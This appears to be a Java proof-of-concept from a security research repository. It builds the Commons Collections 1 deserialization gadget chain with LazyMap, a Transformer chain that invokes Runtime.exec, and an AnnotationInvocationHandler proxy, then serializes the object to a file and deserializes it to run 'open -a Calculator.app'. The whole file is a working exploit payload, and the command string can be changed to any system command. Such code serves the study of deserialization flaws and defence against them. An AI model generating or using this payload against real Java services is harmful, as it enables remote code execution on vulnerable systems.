package org.su18.serialize.ysoserial.CommonCollections.CommonCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
public class CC1WithLazyMap {


	public static String fileName = "CC1withLazyMap.bin";


	public static void main(String[] args) throws Exception {
		// 结合 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
		});


		Map            lazyMap     = LazyMap.decorate(new HashMap(), chain);
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		// 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
		InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
		// 创建LazyMap的动态代理类实例
		Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);

		SerializeUtil.writeObjectToFile(invocationHandler, fileName);
		SerializeUtil.readFileObject(fileName);
	}

}
